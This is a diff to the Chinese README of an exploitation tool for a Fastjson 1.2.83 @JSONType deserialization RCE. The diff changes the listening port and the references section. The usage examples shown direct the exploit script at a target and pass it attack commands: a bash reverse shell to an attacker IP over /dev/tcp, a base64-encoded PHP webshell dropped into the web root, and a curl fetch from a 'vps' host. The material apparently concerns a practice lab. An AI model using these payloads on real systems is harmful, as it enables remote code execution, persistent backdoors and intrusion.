@@ -39,7 +39,7 @@ Fastjson 1.2.83 反序列化漏洞利用工具，基于 `@JSONType` 注解 + 文
 java -jar fastjson_vul.jar
 ```
 
-默认监听 `0.0.0.0:8080`，接受 POST 请求，JSON 解析端点为 `/parse`。
+默认监听 `0.0.0.0:8081`，接受 POST 请求，JSON 解析端点为 `/parse`。
 
 ---
 
@@ -61,7 +61,7 @@ python3 fd_enum_exp.py <target-url> <local-ip>
 
 | 参数 | 说明 | 示例 |
 |------|------|------|
-| `target-url` | 靶场的漏洞端点 URL | `http://192.168.150.128:8080/parse` |
+| `target-url` | 靶场的漏洞端点 URL | `http://192.168.150.128:8081/parse` |
 | `local-ip` | 攻击机 IP（靶机能访问到的） | `192.168.150.1` |
 | `--cmd` | 自定义执行命令（可选） | `"curl http://vps:port/shell"` |
 
@@ -69,10 +69,10 @@ python3 fd_enum_exp.py <target-url> <local-ip>
 
 ```bash
 # 基本用法
-python3 fd_enum_exp.py http://192.168.150.128:8080/parse 192.168.150.1
+python3 fd_enum_exp.py http://192.168.150.128:8081/parse 192.168.150.1
 
 # 自定义命令
-python3 fd_enum_exp.py http://192.168.150.128:8080/parse 192.168.150.1 --cmd "id > /tmp/pwned"
+python3 fd_enum_exp.py http://192.168.150.128:8081/parse 192.168.150.1 --cmd "id > /tmp/pwned"
 ```
 
 ---
@@ -162,17 +162,18 @@ cat /tmp/PWNED
 
 ```bash
 # 反弹 shell
-python3 fd_enum_exp.py http://target:8080/parse 10.0.0.1 --cmd "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
+python3 fd_enum_exp.py http://target:8081/parse 10.0.0.1 --cmd "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
 
 # 写入 webshell
-python3 fd_enum_exp.py http://target:8080/parse 10.0.0.1 --cmd "echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/shell.php"
+python3 fd_enum_exp.py http://target:8081/parse 10.0.0.1 --cmd "echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/shell.php"
 ```
 
 ---
 
-## 致谢
+## 参考
 
-- [[wouijvziqy/Fastjson-JsonType-RCE-PoC](https://github.com/wouijvziqy/Fastjson-JsonType-RCE-PoC) — jar-URL-as-internal-name](https://github.com/dinosn/fastjson-jsontype-rce-lab) 技术来源
+- [dinosn/fastjson-jsontype-rce-lab](https://github.com/dinosn/fastjson-jsontype-rce-lab)
+- [Fastjson @JSONType RCE 深入分析](https://mp.weixin.qq.com/s/hyKifHPIa9_cI8bzCulSVQ)
 
 ## 免责声明
 
